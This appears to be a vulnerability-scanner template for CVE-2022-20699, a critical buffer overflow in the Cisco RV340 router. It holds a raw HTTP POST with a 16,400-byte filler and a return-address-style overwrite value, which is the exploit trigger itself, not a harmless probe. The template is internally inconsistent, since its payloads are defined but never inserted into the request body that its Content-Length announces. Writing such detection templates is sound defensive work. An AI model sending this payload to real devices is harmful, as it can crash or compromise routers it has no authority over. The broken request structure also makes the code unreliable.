id: CVE-2022-20699

info:
  name: Cisco RV340 WAN Buffer Overflow
  author: Pedro Ribeiro, Radek Domanski
  severity: critical
  description: |
    This template checks for a buffer overflow vulnerability in the Cisco RV340 WAN device. The vulnerability could allow an attacker to execute arbitrary code on the device.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-20699
    - https://github.com/puckiestyle/CVE-2022-20699/blob/main/CVE-2022-20699.py
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-20699
    cwe-id: CWE-1284,CWE-121
    epss-score: 0.96007
    epss-percentile: 0.99551
    cpe: cpe:2.3:o:cisco:rv340_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 10
    vendor: cisco
    product: rv340
  tags: cisco, buffer-overflow, rv340

http:
  - raw:
      - |
        POST /X HTTP/1.1
        Host: {{Hostname}}:8443
        Content-Length: 16404

    payloads:
      filler:
        - "{{repeat('\\x05', 16400)}}"
      pc:
        - "\\x98\\xed\\x4a\\x70"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Internal Server Error"